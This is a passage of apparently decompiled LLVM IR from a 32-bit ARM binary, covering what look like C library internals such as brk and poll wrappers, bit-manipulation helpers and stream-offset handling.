  %v5_131d8 = add i32 %v4_131d8, %arg1
  %v6_131d8 = inttoptr i32 %v5_131d8 to i32*
  %v7_131d8 = load i32, i32* %v6_131d8, align 4
  %v1_131dc = urem i32 %v1_131d0, 32
  %v7_131e4 = shl i32 1, %v1_131dc
  %v8_131e4 = or i32 %v7_131d8, %v7_131e4
  store i32 %v8_131e4, i32* %v6_131d8, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_131d0, { 1, 0 }
}

define i32 @function_131f4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_131f4:
  %v1_131f4 = add i32 %arg2, -1
  %v3_131f8 = udiv i32 %v1_131f4, 32
  %v4_131fc = mul nuw nsw i32 %v3_131f8, 4
  %v5_131fc = add i32 %v4_131fc, %arg1
  %v6_131fc = inttoptr i32 %v5_131fc to i32*
  %v7_131fc = load i32, i32* %v6_131fc, align 4
  %v1_13200 = urem i32 %v1_131f4, 32
  %tmp = shl i32 -1, %v1_13200
  %v8_13208 = add i32 %tmp, -1
  %v9_13208 = and i32 %v7_131fc, %v8_13208
  store i32 %v9_13208, i32* %v6_131fc, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_131f4, { 1, 0 }
}

define i32 @function_13218(i32 %arg1) local_unnamed_addr {
dec_label_pc_13218:
  %v1_13218 = add i32 %arg1, 28
  %v2_13218 = inttoptr i32 %v1_13218 to i32*
  %v3_13218 = load i32, i32* %v2_13218, align 4
  %v1_13220 = add i32 %arg1, 44
  %v2_13220 = inttoptr i32 %v1_13220 to i32*
  %v3_13220 = load i32, i32* %v2_13220, align 4
  store i32 %v3_13218, i32* @global_var_21dc4.588, align 4
  store i32 %v3_13220, i32* @global_var_21dc8.590, align 4
  ret i32 %arg1
}

define i32 @function_1323c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1323c:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_13244 = call i32 @brk(i32* %arg1)
  %v3_13248 = icmp ult i32 %v2_13244, %tmp
  store i32 %v2_13244, i32* @global_var_21b64.525, align 4
  br i1 %v3_13248, label %dec_label_pc_1325c, label %dec_label_pc_1326c

dec_label_pc_1325c:                               ; preds = %dec_label_pc_1323c
  %v0_1325c = call i32 @function_cc08()
  %v2_13264 = inttoptr i32 %v0_1325c to i32*
  store i32 12, i32* %v2_13264, align 4
  br label %dec_label_pc_1326c

dec_label_pc_1326c:                               ; preds = %dec_label_pc_1323c, %dec_label_pc_1325c
  %v0_1326c = phi i32 [ 0, %dec_label_pc_1323c ], [ -1, %dec_label_pc_1325c ]
  ret i32 %v0_1326c

; uselistorder directives
  uselistorder i32* @global_var_21b64.525, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1326c, { 1, 0 }
}

define i32 @function_13278() local_unnamed_addr {
dec_label_pc_13278:
  %stack_var_-8 = alloca i32, align 4
  %v3_13278 = load i32, i32* @r4, align 4
  store i32 %v3_13278, i32* %stack_var_-8, align 4
  %v0_1327c = load i32, i32* @r0, align 4
  %v0_13280 = call i32 @function_cc08()
  %v1_13284 = sub i32 0, %v0_1327c
  %v2_13288 = inttoptr i32 %v0_13280 to i32*
  store i32 %v1_13284, i32* %v2_13288, align 4
  %v2_13290 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13290, i32* @r4, align 4
  ret i32 -1
}

define i32 @function_13294(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_13294:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13294 = load i32, i32* @r4, align 4
  store i32 %v3_13294, i32* %stack_var_-8, align 4
  %v5_13298 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_13298, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13298, -4095
  br i1 %tmp, label %dec_label_pc_132b8, label %dec_label_pc_132a8

dec_label_pc_132a8:                               ; preds = %dec_label_pc_13294
  %v0_132a8 = call i32 @function_cc08()
  %v0_132ac = load i32, i32* %r4.global-to-local, align 4
  %v1_132ac = sub i32 0, %v0_132ac
  %v2_132b0 = inttoptr i32 %v0_132a8 to i32*
  store i32 %v1_132ac, i32* %v2_132b0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_132b8

dec_label_pc_132b8:                               ; preds = %dec_label_pc_13294, %dec_label_pc_132a8
  %v0_132b8 = phi i32 [ %v5_13298, %dec_label_pc_13294 ], [ -1, %dec_label_pc_132a8 ]
  %v2_132bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_132bc, i32* @r4, align 4
  ret i32 %v0_132b8

; uselistorder directives
  uselistorder i32 %v5_13298, { 1, 0, 2 }
  uselistorder label %dec_label_pc_132b8, { 1, 0 }
}

define i32 @function_132c0() local_unnamed_addr {
dec_label_pc_132c0:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_132c0 = load i32, i32* @r2, align 4
  store i32 %v0_132c0, i32* %r3.global-to-local, align 4
  %v0_132c4 = load i32, i32* @r1, align 4
  %v3_132c4 = ashr i32 %v0_132c4, 31
  store i32 %v3_132c4, i32* %r2.global-to-local, align 4
  %v3_132cc = load i32, i32* @r4, align 4
  %v6_132cc = load i32, i32* @r5, align 4
  %v9_132cc = load i32, i32* @r6, align 4
  %v2_132d4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_132c0, i32* @r6, align 4
  %v0_132dc = load i32, i32* @r0, align 4
  store i32 %v0_132dc, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_132c0, 3
  br i1 %tmp, label %dec_label_pc_132f8, label %dec_label_pc_132e4

dec_label_pc_132e4:                               ; preds = %dec_label_pc_132c0
  %v0_132e4 = call i32 @function_cc08()
  store i32 %v0_132e4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_132f0 = inttoptr i32 %v0_132e4 to i32*
  store i32 22, i32* %v2_132f0, align 4
  br label %.thread3

dec_label_pc_132f8:                               ; preds = %dec_label_pc_132c0
  %v1_132f8 = add i32 %v0_132dc, 52
  %v2_132f8 = inttoptr i32 %v1_132f8 to i32*
  %v3_132f8 = load i32, i32* %v2_132f8, align 4
  store i32 %v3_132f8, i32* %r7.global-to-local, align 4
  %v2_132fc = icmp eq i32 %v3_132f8, 0
  store i32 %v0_132c4, i32* %stack_var_-28, align 4
  br i1 %v2_132fc, label %dec_label_pc_1330c, label %dec_label_pc_13338

dec_label_pc_1330c:                               ; preds = %dec_label_pc_132f8
  %v1_1330c = add i32 %v0_132dc, 56
  store i32 %v1_1330c, i32* @r4, align 4
  store i32 67648, i32* %r3.global-to-local, align 4
  store i32 %v2_132d4, i32* @r0, align 4
  store i32 %v1_1330c, i32* %r2.global-to-local, align 4
  %v1_13324 = call i32 @function_10840()
  %v0_13328 = load i32, i32* @r4, align 4
  store i32 %v0_13328, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r3.global-to-local, align 4
  store i32 78648, i32* @lr, align 4
  %v1_13334 = call i32 @function_10838()
  store i32 %v1_13334, i32* %r0.global-to-local, align 4
  %v0_13338.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13338

dec_label_pc_13338:                               ; preds = %dec_label_pc_132f8, %dec_label_pc_1330c
  %v0_13344 = phi i32 [ %v0_132dc, %dec_label_pc_132f8 ], [ %v0_13338.pre, %dec_label_pc_1330c ]
  %v1_13338 = inttoptr i32 %v0_13344 to i8*
  %v2_13338 = load i8, i8* %v1_13338, align 1
  %v3_13338 = zext i8 %v2_13338 to i32
  store i32 %v3_13338, i32* %r3.global-to-local, align 4
  %v1_1333c = and i32 %v3_13338, 64
  %v2_1333c = icmp eq i32 %v1_1333c, 0
  br i1 %v2_1333c, label %dec_label_pc_13354, label %dec_label_pc_13344

dec_label_pc_13344:                               ; preds = %dec_label_pc_13338
  store i32 %v0_13344, i32* @r0, align 4
  %v0_13348 = call i32 @function_d60c()
  store i32 %v0_13348, i32* %r0.global-to-local, align 4
  %v2_1334c = icmp eq i32 %v0_13348, 0
  br i1 %v2_1334c, label %dec_label_pc_13354, label %dec_label_pc_133c4

dec_label_pc_13354:                               ; preds = %dec_label_pc_13344, %dec_label_pc_13338
  %v0_13354 = load i32, i32* @r6, align 4
  %v7_13354 = icmp eq i32 %v0_13354, 1
  br i1 %v7_13354, label %dec_label_pc_1335c, label %dec_label_pc_13354.dec_label_pc_13370_crit_edge

dec_label_pc_13354.dec_label_pc_13370_crit_edge:  ; preds = %dec_label_pc_13354
  br label %dec_label_pc_13370

dec_label_pc_1335c:                               ; preds = %dec_label_pc_13354
  %v0_1335c = load i32, i32* @r5, align 4
  store i32 %v0_1335c, i32* %r0.global-to-local, align 4
  %v2_13360 = ptrtoint i32* %stack_var_-28 to i32
  %v2_13364 = inttoptr i32 %v0_1335c to i8*
  %v3_13364 = call i32 @function_13458(i8* %v2_13364, i32 %v2_13360)
  store i32 %v3_13364, i32* %r0.global-to-local, align 4
  %v1_13368 = icmp slt i32 %v3_13364, 0
  br i1 %v1_13368, label %dec_label_pc_133c4, label %dec_label_pc_1335c.dec_label_pc_13370_crit_edge

dec_label_pc_1335c.dec_label_pc_13370_crit_edge:  ; preds = %dec_label_pc_1335c
  %v0_13370.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13370

dec_label_pc_13370:                               ; preds = %dec_label_pc_13354.dec_label_pc_13370_crit_edge, %dec_label_pc_1335c.dec_label_pc_13370_crit_edge
  %v0_13370 = phi i32 [ %v0_13354, %dec_label_pc_13354.dec_label_pc_13370_crit_edge ], [ %v0_13370.pre, %dec_label_pc_1335c.dec_label_pc_13370_crit_edge ]
  store i32 %v0_13370, i32* %r2.global-to-local, align 4
  %v0_13374 = load i32, i32* @r5, align 4
  store i32 %v0_13374, i32* %r0.global-to-local, align 4
  %v4_1337c = call i32 @function_1360c(i32 %v0_13374, i32* nonnull %stack_var_-28, i32 %v0_13370)
  store i32 %v4_1337c, i32* %r0.global-to-local, align 4
  %v1_13380 = icmp slt i32 %v4_1337c, 0
  br i1 %v1_13380, label %dec_label_pc_133c4, label %dec_label_pc_13388

dec_label_pc_13388:                               ; preds = %dec_label_pc_13370
  %v0_13388 = load i32, i32* @r5, align 4
  %v1_13388 = inttoptr i32 %v0_13388 to i32*
  %v2_13388 = load i32, i32* %v1_13388, align 4
  store i32 %v2_13388, i32* %r3.global-to-local, align 4
  %v1_1338c = add i32 %v0_13388, 8
  %v2_1338c = inttoptr i32 %v1_1338c to i32*
  %v3_1338c = load i32, i32* %v2_1338c, align 4
  store i32 %v3_1338c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13394 = and i32 %v2_13388, -72
  store i32 %v1_13394, i32* %r3.global-to-local, align 4
  %v3_13398 = sdiv i32 %v2_13388, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_133a0 = trunc i32 %v3_13398 to i8
  %v3_133a0 = add i32 %v0_13388, 1
  %v4_133a0 = inttoptr i32 %v3_133a0 to i8*
  store i8 %v1_133a0, i8* %v4_133a0, align 1
  %v0_133a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_133a4 = load i32, i32* @r5, align 4
  %v2_133a4 = add i32 %v1_133a4, 28
  %v3_133a4 = inttoptr i32 %v2_133a4 to i32*
  store i32 %v0_133a4, i32* %v3_133a4, align 4
  %v0_133a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_133a8 = trunc i32 %v0_133a8 to i8
  %v2_133a8 = load i32, i32* @r5, align 4
  %v3_133a8 = add i32 %v2_133a8, 2
  %v4_133a8 = inttoptr i32 %v3_133a8 to i8*
  store i8 %v1_133a8, i8* %v4_133a8, align 1
  %v0_133ac = load i32, i32* %r3.global-to-local, align 4
  %v1_133ac = trunc i32 %v0_133ac to i8
  %v2_133ac = load i32, i32* @r5, align 4
  %v3_133ac = inttoptr i32 %v2_133ac to i8*
  store i8 %v1_133ac, i8* %v3_133ac, align 1
  %v0_133b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_133b0 = load i32, i32* @r5, align 4
  %v2_133b0 = add i32 %v1_133b0, 16
  %v3_133b0 = inttoptr i32 %v2_133b0 to i32*
  store i32 %v0_133b0, i32* %v3_133b0, align 4
  %v0_133b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_133b4 = load i32, i32* @r5, align 4
  %v2_133b4 = add i32 %v1_133b4, 20
  %v3_133b4 = inttoptr i32 %v2_133b4 to i32*
  store i32 %v0_133b4, i32* %v3_133b4, align 4
  %v0_133b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_133b8 = load i32, i32* @r5, align 4
  %v2_133b8 = add i32 %v1_133b8, 24
  %v3_133b8 = inttoptr i32 %v2_133b8 to i32*
  store i32 %v0_133b8, i32* %v3_133b8, align 4
  %v0_133bc = load i32, i32* %r0.global-to-local, align 4
  %v1_133bc = load i32, i32* @r5, align 4
  %v2_133bc = add i32 %v1_133bc, 44
  %v3_133bc = inttoptr i32 %v2_133bc to i32*
  store i32 %v0_133bc, i32* %v3_133bc, align 4
  br label %dec_label_pc_133c8

dec_label_pc_133c4:                               ; preds = %dec_label_pc_13344, %dec_label_pc_13370, %dec_label_pc_1335c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_133c8

dec_label_pc_133c8:                               ; preds = %dec_label_pc_13388, %dec_label_pc_133c4
  %v0_133c8 = load i32, i32* %r7.global-to-local, align 4
  %v2_133c8 = icmp eq i32 %v0_133c8, 0
  br i1 %v2_133c8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_133c8
  store i32 %v2_132d4, i32* %r0.global-to-local, align 4
  store i32 67648, i32* %r3.global-to-local, align 4
  store i32 78816, i32* @lr, align 4
  call void @__pseudo_branch(i32 67648)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_133c8, %dec_label_pc_132e4, %bb
  %v0_133e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_133e0, i32* %r0.global-to-local, align 4
  store i32 %v3_132cc, i32* @r4, align 4
  store i32 %v6_132cc, i32* @r5, align 4
  store i32 %v9_132cc, i32* @r6, align 4
  ret i32 %v0_133e0

; uselistorder directives
  uselistorder i32 %v0_13370, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 12, 6, 11, 7, 9, 0, 8, 10 }
  uselistorder i32 ()* @function_10838, { 36, 34, 33, 32, 31, 30, 29, 28, 4, 37, 5, 3, 2, 1, 27, 0, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 8, 7, 6, 16, 15, 14, 35, 41, 42, 13, 12, 40, 39, 38, 11, 10, 9 }
  uselistorder i32 ptrtoint (i8* @global_var_10838.270 to i32), { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @function_10840, { 42, 41, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 0, 1, 44, 43, 3, 2, 26, 25, 10, 9, 8, 7, 6, 5, 4, 24, 23, 22, 21, 40, 51, 20, 19, 18, 17, 50, 49, 48, 47, 46, 45, 16, 15, 14, 13, 12, 11 }
  uselistorder i32 67648, { 0, 4, 5, 6, 7, 1, 8, 9, 10, 2, 3, 11, 12, 13, 14 }
  uselistorder i32 52, { 4, 6, 5, 3, 2, 7, 8, 1, 0, 9 }
  uselistorder i32 22, { 1, 9, 2, 3, 7, 10, 11, 4, 12, 0, 13, 5, 8, 6 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_133c8, { 1, 0 }
  uselistorder label %dec_label_pc_133c4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13370, { 1, 0 }
  uselistorder label %dec_label_pc_13338, { 1, 0 }
}

define i32 @function_133fc(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_133fc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_133fc = load i32, i32* @r4, align 4
  store i32 %v3_133fc, i32* %stack_var_-12, align 4
  %v3_13400 = load i8, i8* %arg1, align 1
  %v4_13400 = zext i8 %v3_13400 to i32
  store i32 %v4_13400, i32* %r3.global-to-local, align 4
  %v1_13404 = and i32 %v4_13400, 4
  store i32 %v1_13404, i32* %r5.global-to-local, align 4
  %v2_13404 = icmp eq i32 %v1_13404, 0
  store i1 %v2_13404, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_13404, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_133fc
  store i32 %v3_133fc, i32* @r4, align 4
  ret i32 0

bb8:                                              ; preds = %dec_label_pc_133fc
  %v1_13414 = icmp slt i32 %arg2, 0
  %v2_13414 = icmp eq i32 %arg2, 0
  store i1 %v2_13414, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_13414, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_1341c = add i32 %tmp, 4
  %v2_1341c = inttoptr i32 %v1_1341c to i32*
  %v3_1341c = load i32, i32* %v2_1341c, align 4
  store i32 %v3_1341c, i32* %r0.global-to-local, align 4
  %v1_13420 = call i32 @function_1457c(i32 %v3_1341c)
  store i32 %v1_13420, i32* %r0.global-to-local, align 4
  %v2_13424 = icmp eq i32 %v1_13420, 0
  store i1 %v2_13424, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_13420, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_13428 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_13428, i32* @r4, align 4
  ret i32 %v1_13420

bb13:                                             ; preds = %bb10
  %v0_1342c = load i32, i32* @r4, align 4
  %v1_1342c = inttoptr i32 %v0_1342c to i32*
  %v2_1342c = load i32, i32* %v1_1342c, align 4
  %v1_13430 = or i32 %v2_1342c, 8
  store i32 %v1_13430, i32* %r1.global-to-local, align 4
  %v1_13434 = or i32 %v2_1342c, 4
  store i32 %v1_13434, i32* %r3.global-to-local, align 4
  %v3_13438 = sdiv i32 %v2_1342c, 256
  store i32 %v3_13438, i32* %ip.global-to-local, align 4
  br i1 %v2_13424, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_13440 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_13440, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_13444 = trunc i32 %v3_13438 to i8
  %v4_13444 = add i32 %v0_1342c, 1
  %v5_13444 = inttoptr i32 %v4_13444 to i8*
  store i8 %v2_13444, i8* %v5_13444, align 1
  %v0_13448.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13448.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_13448 = load i32, i32* %r3.global-to-local, align 4
  %v2_13448 = trunc i32 %v1_13448 to i8
  %v3_13448 = load i32, i32* @r4, align 4
  %v4_13448 = inttoptr i32 %v3_13448 to i8*
  store i8 %v2_13448, i8* %v4_13448, align 1
  %v0_1344c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1344c.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_1344c = load i32, i32* %ip.global-to-local, align 4
  %v2_1344c = trunc i32 %v1_1344c to i8
  %v3_1344c = load i32, i32* @r4, align 4
  %v4_1344c = add i32 %v3_1344c, 1
  %v5_1344c = inttoptr i32 %v4_1344c to i8*
  store i8 %v2_1344c, i8* %v5_1344c, align 1
  %v0_13450.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13450.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_13450 = load i32, i32* %r1.global-to-local, align 4
  %v2_13450 = trunc i32 %v1_13450 to i8
  %v3_13450 = load i32, i32* @r4, align 4
  %v4_13450 = inttoptr i32 %v3_13450 to i8*
  store i8 %v2_13450, i8* %v4_13450, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_13454 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13454, i32* @r4, align 4
  %v11_13454 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_13454

; uselistorder directives
  uselistorder i32 %v3_13438, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 5, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 2147483647, { 2, 3, 0, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @function_13458(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13458:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_13458 = load i32, i32* @r4, align 4
  store i32 %v3_13458, i32* %stack_var_-16, align 4
  %v2_1345c = add i32 %tmp, 1
  %v3_1345c = inttoptr i32 %v2_1345c to i8*
  %v4_1345c = load i8, i8* %v3_1345c, align 1
  %v5_1345c = zext i8 %v4_1345c to i32
  %v3_13460 = load i8, i8* %arg1, align 1
  %v4_13460 = zext i8 %v3_13460 to i32
  store i32 %v4_13460, i32* %r2.global-to-local, align 4
  %v4_13464 = mul nuw nsw i32 %v5_1345c, 256
  %v5_13464 = or i32 %v4_13460, %v4_13464
  store i32 %v5_13464, i32* @lr, align 4
  %tmp15 = urem i8 %v3_13460, 4
  %v2_13468 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_13468, label %bb, label %dec_label_pc_13478

bb:                                               ; preds = %dec_label_pc_13458
  store i32 0, i32* @ip, align 4
  br label %.thread

dec_label_pc_13478:                               ; preds = %dec_label_pc_13458
  %v1_13468 = zext i8 %tmp15 to i32
  %v1_13478 = add nsw i32 %v1_13468, -1
  store i32 %v1_13478, i32* @ip, align 4
  %v7_13478 = icmp eq i8 %tmp15, 1
  br i1 %v7_13478, label %.thread, label %dec_label_pc_13480

dec_label_pc_13480:                               ; preds = %dec_label_pc_13478
  %v1_13480 = and i32 %v4_13464, 2048
  %v2_13480 = icmp eq i32 %v1_13480, 0
  br i1 %v2_13480, label %.thread, label %dec_label_pc_13488

dec_label_pc_13488:                               ; preds = %dec_label_pc_13480
  %v8_1348c = icmp sgt i32 %v1_13478, 1
  br i1 %v8_1348c, label %dec_label_pc_13518, label %dec_label_pc_13490

dec_label_pc_13490:                               ; preds = %dec_label_pc_13488
  %v2_13490 = add i32 %tmp, 40
  %v3_13490 = inttoptr i32 %v2_13490 to i32*
  %v4_13490 = load i32, i32* %v3_13490, align 4
  %v2_13494 = icmp eq i32 %v4_13490, 0
  br i1 %v2_13494, label %dec_label_pc_1349c, label %dec_label_pc_13518

dec_label_pc_1349c:                               ; preds = %dec_label_pc_13490
  %v2_1349c = add i32 %tmp, 3
  %v3_1349c = inttoptr i32 %v2_1349c to i8*
  %v4_1349c = load i8, i8* %v3_1349c, align 1
  %v5_1349c = zext i8 %v4_1349c to i32
  %v2_134a0 = add i32 %tmp, 44
  %v3_134a0 = inttoptr i32 %v2_134a0 to i32*
  %v4_134a0 = load i32, i32* %v3_134a0, align 4
  store i32 %v4_134a0, i32* %r2.global-to-local, align 4
  %v2_134a4 = sub nsw i32 %v1_13478, %v5_1349c
  %v1_134ac = add nsw i32 %v2_134a4, -1
  store i32 %v1_134ac, i32* @ip, align 4
  %tmp11 = icmp slt i32 %v4_134a0, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_1349c
  %v7_134b0 = add i32 %tmp, 2
  %v8_134b0 = inttoptr i32 %v7_134b0 to i8*
  %v9_134b0 = load i8, i8* %v8_134b0, align 1
  %v10_134b0 = zext i8 %v9_134b0 to i32
  %v7_134b4 = sub nsw i32 %v1_134ac, %v10_134b0
  store i32 %v7_134b4, i32* @ip, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1349c, %bb, %dec_label_pc_13480, %dec_label_pc_13478, %bb12
  %v0_134d0 = phi i32 [ %v1_13478, %dec_label_pc_13480 ], [ %v1_13478, %dec_label_pc_13478 ], [ 0, %bb ], [ %v7_134b4, %bb12 ], [ %v1_134ac, %dec_label_pc_1349c ]
  %v1_134b8 = and i32 %v4_13460, 64
  %v2_134b8 = icmp eq i32 %v1_134b8, 0
  %storemerge.in.in.v = select i1 %v2_134b8, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_134c4 = add i32 %tmp, 16
  %v3_134c4 = inttoptr i32 %v2_134c4 to i32*
  %v4_134c4 = load i32, i32* %v3_134c4, align 4
  %v2_134c8 = sub i32 %storemerge, %v4_134c4
  %v1_134cc = inttoptr i32 %arg2 to i32*
  %v2_134cc = load i32, i32* %v1_134cc, align 4
  store i32 %v2_134cc, i32* %r1.global-to-local, align 4
  %v3_134cc = add i32 %arg2, 4
  %v4_134cc = inttoptr i32 %v3_134cc to i32*
  %v5_134cc = load i32, i32* %v4_134cc, align 4
  store i32 %v5_134cc, i32* %r2.global-to-local, align 4
  %v2_134d0 = add i32 %v2_134c8, %v0_134d0
  store i32 %v2_134d0, i32* %r5.global-to-local, align 4
  %v2_134d4 = sub i32 %v2_134cc, %v2_134d0
  %v2_134d8 = and i32 %v2_134d0, 1073741824
  %v3_134d8 = icmp ne i32 %v2_134d8, 0
  %v6_134d8 = icmp eq i1 %v3_134d8, false
  %tmp16 = icmp slt i32 %v2_134d0, 0
  %v4_134d8.neg = zext i1 %tmp16 to i32
  %v7_134d8 = add i32 %v5_134cc, %v4_134d8.neg
  %v9_134d8 = sext i1 %v6_134d8 to i32
  %v10_134d8 = add i32 %v7_134d8, %v9_134d8
  store i32 %v10_134d8, i32* %r4.global-to-local, align 4
  store i32 %v2_134d4, i32* %v1_134cc, align 4
  %v5_134dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_134dc, i32* %v4_134cc, align 4
  %v0_134e0 = load i32, i32* %r6.global-to-local, align 4
  %v1_134e0 = add i32 %v0_134e0, 4
  %v2_134e0 = inttoptr i32 %v1_134e0 to i32*
  %v3_134e0 = load i32, i32* %v2_134e0, align 4
  %v1_134e4 = load i32, i32* %r2.global-to-local, align 4
  %v8_134e8 = icmp sgt i32 %v3_134e0, %v1_134e4
  br i1 %v8_134e8, label %dec_label_pc_134fc, label %dec_label_pc_134ec

dec_label_pc_134ec:                               ; preds = %.thread
  %v9_134e4 = icmp eq i32 %v3_134e0, %v1_134e4
  br i1 %v9_134e4, label %dec_label_pc_134f0, label %dec_label_pc_13500thread-pre-split

dec_label_pc_134f0:                               ; preds = %dec_label_pc_134ec
  %v1_134f0 = inttoptr i32 %v0_134e0 to i32*
  %v2_134f0 = load i32, i32* %v1_134f0, align 4
  %v1_134f4 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_134f0, %v1_134f4
  br i1 %tmp17, label %dec_label_pc_134fc, label %dec_label_pc_13500thread-pre-split

dec_label_pc_134fc:                               ; preds = %dec_label_pc_134f0, %.thread
  %v0_134fc = load i32, i32* %r5.global-to-local, align 4
  %v1_134fc = sub i32 0, %v0_134fc
  store i32 %v1_134fc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13500

dec_label_pc_13500thread-pre-split:               ; preds = %dec_label_pc_134f0, %dec_label_pc_134ec
  %v0_13500.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13500

dec_label_pc_13500:                               ; preds = %dec_label_pc_13500thread-pre-split, %dec_label_pc_134fc
  %v0_13500 = phi i32 [ %v0_13500.pr, %dec_label_pc_13500thread-pre-split ], [ %v1_134fc, %dec_label_pc_134fc ]
  %v1_13500 = icmp slt i32 %v0_13500, 0
  br i1 %v1_13500, label %dec_label_pc_13508, label %dec_label_pc_1351c

dec_label_pc_13508:                               ; preds = %dec_label_pc_13500
  %v0_13508 = call i32 @function_cc08()
  %v2_13510 = inttoptr i32 %v0_13508 to i32*
  store i32 75, i32* %v2_13510, align 4
  %v0_1351c.pre = load i32, i32* %r5.global-to-local, align 4
